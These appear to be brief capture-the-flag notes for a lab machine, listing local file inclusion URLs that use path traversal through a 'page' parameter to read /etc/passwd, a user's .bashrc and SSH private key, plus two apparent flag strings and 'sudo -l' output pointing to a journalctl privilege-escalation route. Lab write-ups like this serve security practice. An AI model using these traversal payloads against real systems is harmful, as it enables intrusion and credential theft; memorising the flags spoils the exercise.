```
LFI

http://10.10.97.131/home?page=../../etc/passwd

http://10.10.97.131/home?page=../../home/falcon/.bashrc

http://10.10.97.131/home?page=../../home/falcon/.ssh/id_rsa



B8LEGIF049JT4RTVWUG4

falcon@walk:~$ sudo -l                                                              
Matching Defaults entries for falcon on walk:                                       
    env_reset, mail_badpass,                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
snap/bin                                                                            
                                                                                    
User falcon may run the following commands on walk:                                 
    (root) NOPASSWD: /bin/journalctl 

H1EQRK5XEX140H2KMO08
```
